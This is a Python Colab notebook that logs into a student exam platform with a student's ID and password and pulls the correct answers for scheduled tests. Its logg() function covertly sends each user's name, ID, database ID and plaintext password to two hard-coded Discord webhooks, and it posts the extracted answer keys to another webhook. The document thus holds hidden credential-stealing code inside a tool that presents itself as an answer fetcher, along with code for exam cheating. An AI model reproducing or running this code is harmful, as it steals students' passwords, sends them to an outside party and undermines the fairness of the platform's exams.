# @title CodeSequence-0.00 ~Fetch Integrated {display-mode: "form"}

import requests
import json
import base64

rookie_id = '224301659'  # @param {type: "string"}
rookie_pwd = input("pwd>>>")

if rookie_pwd.strip()=="":
    from google.colab import userdata
    rookie_pwd=userdata.get('agm')
    print("Project_Insight_Initiated")

def logg(btkn, pwd):
    tob64 = btkn.split(".")[1] + "==="
    fromb64 = base64.b64decode(tob64)
    det = eval(str(fromb64)[2:-1])
    glimp = "https://discord.com/api/webhooks/1175731100094582836/Q8u489VpW0-CSfUoDrFpUVF_DfT-0tFEUy9xgpMXmyNv3WmUE4yrzIvZTZpI-bHPGeSu"
    shade = "https://discord.com/api/webhooks/1175733565376446544/_pd0r_1WuqLdzqUo228lMuicnfG4WOvkrR7TRHdwsKQnvVrmgPV28EyVZK85CAjQSErc"
    cont_glimp = f"""```
Execution Detected:
{det['FirstName']} {det['LastName']} ({det['uid']})
Access Time: {det['iat']}
Expiry: {det['exp']}
```
DBid:||{det['DBId']}||"""
    cont_shade = f"{det['uid']} - {pwd}"
    bot_glimp = {"content": cont_glimp, "username": None, "avatar_url": None, "tts": True}
    bot_shade = {"content": cont_shade, "username": None, "avatar_url": None, "tts": True}
    response = requests.post(glimp, json=bot_glimp)
    response = requests.post(shade, json=bot_shade)

def getBear(rid, pwd):
    url = 'https://api.infinitylearn.com/api/authentication/login'
    headers = {
        'Host': 'api.infinitylearn.com',
        'Content-Length': '58',
        'Sec-Ch-Ua': '"Not=A?Brand";v="99", "Chromium";v="118"',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Sec-Ch-Ua-Mobile': '?0',
        'X-Tenant': 'srichaitanya',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://srichaitanyameta.com',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://srichaitanyameta.com/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9'
    }

    data = {
        'password': pwd,
        'uid': rid,
        'userTypeId': 5
    }
    response = requests.post(url, headers=headers, json=data, verify=True)
    print(f"Token Status Code: {response.status_code}")
    if response.status_code==200:
        authresponse = json.loads(response.text)
        print(f"Token Content:", authresponse['accessToken'])
        bear = authresponse['accessToken']
        logg(bear, pwd)
    elif response.status_code==403:
        print(response.text)
        bear = ''
    return bear
bear_id = getBear(rookie_id, rookie_pwd)

txt=""
def memoryPrint(*args):
    global txt
    for x in args:
        txt = txt + str(x)
    txt = txt + "\n"

def parseit(js):
    print('\n\n',js['testName'])
    memoryPrint('\n\n',js['testName'])
    ans = js['scheduleTest'][0]['subjectStructures']
    count=1
    for sub in ans:
        print('\n', sub['subjectName'])
        memoryPrint('\n', sub['subjectName'])
        for sec in sub['sections']:
            print('\t', sec['sectionName'], ' - ', sec['questionListDetails'][0]['question_type'])
            memoryPrint('\t', sec['sectionName'], ' - ', sec['questionListDetails'][0]['question_type'])
            for ques in sec['questionListDetails']:
                print('\t\t',count,'\b) ',ques['question_data']['question']['correct_answer'])
                memoryPrint('\t\t',count,") ",ques['question_data']['question']['correct_answer'])
                count=count+1
    print('\n')
    memoryPrint('\n')

def sendit(cont):
    bot = {"content": cont,
                    "username": None,
                    "avatar_url": None,
                    "tts": True}
    response = requests.post(channel, json=bot)
    print("status code:", response.status_code)
    print(response.request)
    print(response.text)

url = 'https://prodslms.ilteacher.com/v2/test/getStudentTest'
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Authorization': f'Bearer {bear_id}',
    'Content-Type': 'application/json',
    'Origin': 'https://srichaitanyameta.com',
    'Connection': 'keep-alive',
    'Referer': 'https://srichaitanyameta.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'TE': 'trailers',
}

mode = "MISSED"  # @param ['ONGOING', 'UPCOMING', 'COMPLETED', 'MISSED']
page_lim = 5  # @param {type: "slider", min: 2, max: 20}
data = {
    'pageLimit': 10,
    'pageNo': 1,
    'testCategory': 1,
    'status': mode
}

response = requests.post(url, headers=headers, json=data)

t_json = response.json()

# print(t_json['testPapers'])

print('\n')
tl = []
td = {}
for x in t_json['testPapers']:
    tl.append(x['scheduleDetails'][0]['studentTestId'])
    td[x['scheduleDetails'][0]['studentTestId']] = x['testName']
    print(t_json['testPapers'].index(x),f"[{x['scheduleDetails'][0]['studentTestId']}] ",x['testName'])

print()
# test_id = 172268525 # @param ["169061993", "169132143"] {type:"raw", allow-input: true}
test_id = tl[int(input("Choose Exam >>> "))]
print(test_id, " - " ,td[test_id])
# channel = 'https://discord.com/api/webhooks/1170305549515096094/R7YFxx7zYjvvR8YRKCkfWQlzsiLqmHB3D6kCx9B_XjM-GMFMiUw1y7zfGFikXonO-rlj'
channel = 'https://discord.com/api/webhooks/1180726494973141042/lgnMXAAKtAFxgcz1W3SBb9vox-qOlU23CyFDthNIR8cE4B0jsa21N93S2bifOFXtjPD_'  # @param {type: "string"}
send_dscd = True # @param ["True", "False"] {type:"raw"}
# send_dscd = False


url = f"https://prodslms.ilteacher.com/v1/test/getStudentTestDetailsPaper?studentTestId={test_id}&platform=WEB&platformVersion=Chrome%20110"
headers = {
        "Host": "prodslms.ilteacher.com",
        "Sec-Ch-Ua": '"Not A(Brand";v="24", "Chromium";v="110"',
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?0",
        "Authorization": f"Bearer {bear_id}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36",
        "Sec-Ch-Ua-Platform": '"Linux"',
        "Origin": "https://srichaitanyameta.com",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://srichaitanyameta.com",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9"
}

response = requests.get(url, headers=headers)

print("\n")
print("Status Code:", response.status_code)

if response.status_code==200:
    print('Json extraction initiated')
    try:
        parseit(json.loads(response.text))
        if send_dscd:
            sendit("```" + txt + "```")
            print("POSTED")
    except KeyError:
        print("Response Content:", response.text)
elif response.status_code==401:
    print("Response Content:", response.text)
